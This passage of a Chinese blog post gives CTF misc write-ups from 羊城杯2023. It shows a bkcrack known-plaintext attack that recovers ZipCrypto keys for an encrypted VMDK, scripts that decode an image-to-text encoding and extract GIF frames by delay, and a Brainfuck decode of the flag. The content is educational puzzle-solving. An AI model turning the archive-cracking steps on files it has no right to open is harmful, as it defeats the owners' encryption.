+<p>[“小明这次使用了32Bytes的随机密码，这次总不会被爆破出来了吧！！。小明压缩了好了题目后，他发现压缩后大小比压缩前还大啊，这不就没有压缩啊，这是为什么啊！”,”小明这次使用了32Bytes的随机密码，这次总不会被爆破出来了吧！！”]</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031407037.png" srcset="/img/loading.gif" lazyload alt="image-20230903140727939"></p>
+<p>有一个被加密的vmdk文件，可以使用明文爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; ./bkcrack  -C <span class="hljs-string">&#x27;/root/Desktop/Easy_VMDK.zip&#x27;</span> -c <span class="hljs-string">&#x27;flag.vmdk&#x27;</span> -x 0 4B444D5601000000030000<br>bkcrack 1.5.0 - 2023-04-18<br>[14:06:05] Z reduction using 4 bytes of known plaintext<br>100.0 % (4 / 4)<br>[14:06:05] Attack on 1213356 Z values at index 6<br>Keys: e6a73d9f 21ccfdbc f3e0c61c<br>28.6 % (346742 / 1213356)<br>[14:16:24] Keys<br>e6a73d9f 21ccfdbc f3e0c61c<br></code></pre></td></tr></table></figure>
+
+<p>爆破出key了，根据key来解密：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; ./bkcrack  -C <span class="hljs-string">&#x27;/root/Desktop/Easy_VMDK.zip&#x27;</span> -c <span class="hljs-string">&#x27;flag.vmdk&#x27;</span> -k e6a73d9f 21ccfdbc f3e0c61c -d out.zip<br>bkcrack 1.5.0 - 2023-04-18<br>[14:22:49] Writing deciphered data out.zip (maybe compressed)<br>Wrote deciphered data.<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031425278.png" srcset="/img/loading.gif" lazyload alt="image-20230903142505199"></p>
+<p>kali和win中打开的结果不一样</p>
+<p><code>png2txt.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br><br>img = cv2.imread(<span class="hljs-string">&quot;key.png&quot;</span>)<br>r, c = img.shape[:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(r, c)<br><span class="hljs-comment"># 137 2494</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            uu_byte = binascii.a2b_uu(<span class="hljs-string">&#x27;, &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">str</span>(x), img[y, x])) + <span class="hljs-string">&quot;\n&quot;</span>)<br>            f.write(base64.b64encode(uu_byte).decode() + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这是将png转为txt，我们需要反过来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.readlines()<br><br>height = <span class="hljs-number">137</span><br>width = <span class="hljs-number">2494</span><br>img_data = []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> content:<br>    uu_byte = base64.b64decode(line.strip())<br>    img_data.append(binascii.b2a_uu(uu_byte).decode().strip())<br><br>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height), <span class="hljs-string">&#x27;white&#x27;</span>)<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        pixel = <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,img_data[y * width + x].split(<span class="hljs-string">&#x27;, &#x27;</span>)))<br>        im.putpixel((x,y),pixel)<br><br>im.show()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031441444.png" srcset="/img/loading.gif" lazyload alt="image-20230903144136393"></p>
+<p>打开压缩包得到flag</p>
+<h4 id="GIFuck"><a href="#GIFuck" class="headerlink" title="GIFuck"></a>GIFuck</h4><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031409817.png" srcset="/img/loading.gif" lazyload alt="image-20230903140942757"></p>
+<p>一个很多图片组成的gif</p>
+<p>这里了解到了一个新的点，需要判断每张图片的间隔时间，gpt写脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageSequence<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gif_frame_delays</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">try</span>:<br>        image = Image.<span class="hljs-built_in">open</span>(filename)<br><br>        <span class="hljs-comment"># 确保图像为GIF格式</span><br>        <span class="hljs-keyword">if</span> image.<span class="hljs-built_in">format</span> != <span class="hljs-string">&#x27;GIF&#x27;</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;The provided image is not in GIF format.&#x27;</span>)<br><br>        <span class="hljs-comment"># 获取各个帧的延迟时间</span><br>        frame_delays = []<br>        <span class="hljs-keyword">for</span> frame <span class="hljs-keyword">in</span> ImageSequence.Iterator(image):<br>            delay = frame.info.get(<span class="hljs-string">&#x27;duration&#x27;</span>, <span class="hljs-number">100</span>)  <span class="hljs-comment"># 默认延迟时间为100毫秒</span><br>            frame_delays.append(delay)  <span class="hljs-comment"># 将延迟时间转换为秒</span><br><br>        <span class="hljs-keyword">return</span> frame_delays<br><br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;An error occurred while processing the image: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 指定GIF图像文件路径</span><br>gif_file = <span class="hljs-string">&#x27;flag.gif&#x27;</span><br><br><span class="hljs-comment"># 调用函数获取帧间隔时间长度</span><br>frame_delays = get_gif_frame_delays(gif_file)<br><br><span class="hljs-comment"># 检查是否成功获取帧间隔时间长度</span><br><span class="hljs-keyword">if</span> frame_delays <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> i, delay <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(frame_delays):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Frame <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span> delay: <span class="hljs-subst">&#123;delay&#125;</span> mills&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031512028.png" srcset="/img/loading.gif" lazyload alt="image-20230903151256953"></p>
+<p>我们发现图片帧间隔时间都是60的整数倍</p>
+<p>按倍数次去导，稍微改改文件名格式方便后面按顺序读</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment"># 打开GIF文件</span><br>gif_path = <span class="hljs-string">&quot;flag.gif&quot;</span><br>gif_image = Image.<span class="hljs-built_in">open</span>(gif_path)<br><br><span class="hljs-comment"># 获取GIF中的帧数</span><br>num_frames = gif_image.n_frames<br><br><span class="hljs-comment"># 创建一个目录来保存PNG图像</span><br>output_directory = <span class="hljs-string">&quot;output_png_frames_repeat/&quot;</span><br>os.makedirs(output_directory, exist_ok=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 读取并根据时间帧长度导出帧</span><br><span class="hljs-keyword">for</span> frame_number <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_frames):<br>    gif_image.seek(frame_number)<br>    frame_image = gif_image.copy()<br>    duration = gif_image.info[<span class="hljs-string">&#x27;duration&#x27;</span>]  <span class="hljs-comment"># 获取当前帧的时间帧长度（以毫秒为单位）</span><br>    <br>    export_count = duration // <span class="hljs-number">60</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(export_count):<br>        frame_image.save(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;output_directory&#125;</span><span class="hljs-subst">&#123;frame_number:d&#125;</span><span class="hljs-subst">&#123;(i+<span class="hljs-number">1</span>):02d&#125;</span>.png&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>再打印一波字符 这次形式就很对</p>
+<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">++++[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++++<span class="hljs-attribute">&lt;]&gt;</span>-[-&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+<span class="hljs-attribute">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]+++&lt;++&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+++&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]<span class="hljs-attribute">&lt;+++&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+++<span class="hljs-attribute">&lt;++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+<span class="hljs-attribute">&lt;++&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]<span class="hljs-attribute">&lt;+++&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+++<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+++<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;][-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+++<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+++<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+<span class="hljs-attribute">&lt;&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+<span class="hljs-attribute">&lt;&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;][-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+++&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+<span class="hljs-attribute">&lt;&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+<span class="hljs-attribute">&lt;&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;][-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+++<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;-<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]+++<span class="hljs-attribute">&lt;+++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]++<span class="hljs-attribute">&lt;+++&lt;+[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;++++<span class="hljs-attribute">&lt;]&gt;</span>[-&gt;+<span class="hljs-attribute">&lt;]&gt;</span>[-<span class="hljs-attribute">&lt;&lt;&lt;+&gt;</span>&gt;&gt;]<span class="hljs-attribute">&lt;&lt;+++++++++[-&gt;</span>+++++++++<span class="hljs-attribute">&lt;]&gt;</span>++.<span class="hljs-attribute">&lt;+++++[-&gt;</span>+++++<span class="hljs-attribute">&lt;]&gt;</span>+++.+++..+++++++.<span class="hljs-attribute">&lt;+++++++++[-&gt;</span>---------<span class="hljs-attribute">&lt;]&gt;</span>--------.<span class="hljs-attribute">&lt;++++++++[-&gt;</span>++++++++<span class="hljs-attribute">&lt;]&gt;</span>++.<span class="hljs-attribute">&lt;++++[-&gt;</span>++++<span class="hljs-attribute">&lt;]&gt;</span>+++.-.<span class="hljs-attribute">&lt;+++++++++[-&gt;</span>---------<span class="hljs-attribute">&lt;]&gt;</span>---.<span class="hljs-attribute">&lt;+++++++++[-&gt;</span>+++++++++<span class="hljs-attribute">&lt;]&gt;</span>++++++++.<span class="hljs-attribute">&lt;+++[-&gt;</span>---<span class="hljs-attribute">&lt;]&gt;</span>-.++++++.---.<span class="hljs-attribute">&lt;+++++++++[-&gt;</span>---------<span class="hljs-attribute">&lt;]&gt;</span>-.<span class="hljs-attribute">&lt;++++++++[-&gt;</span>++++++++<span class="hljs-attribute">&lt;]&gt;</span>++++++.++++++.<span class="hljs-attribute">&lt;+++[-&gt;</span>---<span class="hljs-attribute">&lt;]&gt;</span>--.++++++.<span class="hljs-attribute">&lt;++++++++[-&gt;</span>--------<span class="hljs-attribute">&lt;]&gt;</span>-------.<span class="hljs-attribute">&lt;++++++++[-&gt;</span>++++++++<span class="hljs-attribute">&lt;]&gt;</span>+++++++++.<span class="hljs-attribute">&lt;+++[-&gt;</span>+++<span class="hljs-attribute">&lt;]&gt;</span>+.<span class="hljs-attribute">&lt;+++++++++[-&gt;</span>---------<span class="hljs-attribute">&lt;]&gt;</span>--.<span class="hljs-attribute">&lt;++++++++[-&gt;</span>++++++++<span class="hljs-attribute">&lt;]&gt;</span>++++++++++++++.+.+++++.<span class="hljs-attribute">&lt;+++++++++[-&gt;</span>---------<span class="hljs-attribute">&lt;]&gt;</span>---.<span class="hljs-attribute">&lt;++++++++[-&gt;</span>++++++++<span class="hljs-attribute">&lt;]&gt;</span>++++++++.---.<span class="hljs-attribute">&lt;+++[-&gt;</span>+++<span class="hljs-attribute">&lt;]&gt;</span>++++.<span class="hljs-attribute">&lt;+++[-&gt;</span>---<span class="hljs-attribute">&lt;]&gt;</span>----.<span class="hljs-attribute">&lt;+++++++[-&gt;</span>-------<span class="hljs-attribute">&lt;]&gt;</span>------.[-]<br></code></pre></td></tr></table></figure>
+
+<p>brainfuck解密</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031643084.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>将内存的16进制解码得到flag</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309031643081.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/" class="print-no-link">#羊城杯2023</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>羊城杯2023</div>
+      <div>https://leekosss.github.io/2023/09/03/羊城杯2023/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年9月7日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/05/%5BMTCTF2022%5Deasypickle/" title="【MTCTF2022】easypickle">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【MTCTF2022】easypickle</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/01/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%E7%86%8A%E6%B5%B7cms/" title="【代码审计】熊海cms">
+                        <span class="hidden-mobile">【代码审计】熊海cms</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
